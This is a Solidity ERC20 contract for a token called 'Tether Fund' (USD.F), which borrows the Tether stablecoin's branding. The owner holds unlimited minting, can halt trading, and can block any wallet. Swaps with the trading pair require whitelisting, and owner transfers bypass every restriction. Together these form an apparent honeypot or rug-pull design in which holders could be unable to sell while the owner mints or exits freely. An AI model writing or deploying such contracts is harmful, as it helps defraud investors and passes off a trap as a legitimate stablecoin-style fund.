///// Proyect Tether Fund
///// https://tetherusdtf.com/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TetherUSDTF is ERC20, Ownable, ReentrancyGuard {
    bool public tradingEnabled = false;
    address internal pairAddress;
    uint256 initialSupply =  100_000_000_000 * 10 ** decimals();
    mapping(address => bool) public isWhitelisted;
    mapping(address => bool) public isBlocked;

    constructor() ERC20("Tether Fund", "USD.F") Ownable(msg.sender) {
        _mint(msg.sender, initialSupply );
    }

    function setPair(address _pair) public onlyOwner {
        pairAddress = _pair;
    }

    function viewPair() public view onlyOwner returns (address) {
        return pairAddress;
    }

    function addToWhitelist(address _addr) public onlyOwner {
        isWhitelisted[_addr] = true;
    }

    function removeFromWhitelist(address _addr) public onlyOwner {
        isWhitelisted[_addr] = false;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }

    function stopTrading() external onlyOwner {
        tradingEnabled = false;
    }

    function blockWallet(address wallet) external onlyOwner {
        isBlocked[wallet] = true;
    }

    function unblockWallet(address wallet) external onlyOwner {
        isBlocked[wallet] = false;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount * 10 ** decimals());
    }

    function recoverTokens(address tokenAddress, uint256 amount) external onlyOwner {
        require(tokenAddress != address(this), "Cannot recover own token");
        IERC20(tokenAddress).transfer(owner(), amount);
    }

    // ✅ Aquí va TODO el control: sobrescribe _update
    function _update(address from, address to, uint256 value)
        internal
        virtual
        override
    {
        if (from != address(0) && to != address(0)) {
            if (from != owner() && to != owner()) {
                require(tradingEnabled, "Trading is disabled");
                require(!isBlocked[from], "Sender is blocked");
                require(!isBlocked[to], "Recipient is blocked");
            }

            if (from == pairAddress || to == pairAddress) {
                require(
                    isWhitelisted[from] || isWhitelisted[to],
                    "Swap blocked: not whitelisted"
                );
            }
        }

        super._update(from, to, value);
    }
}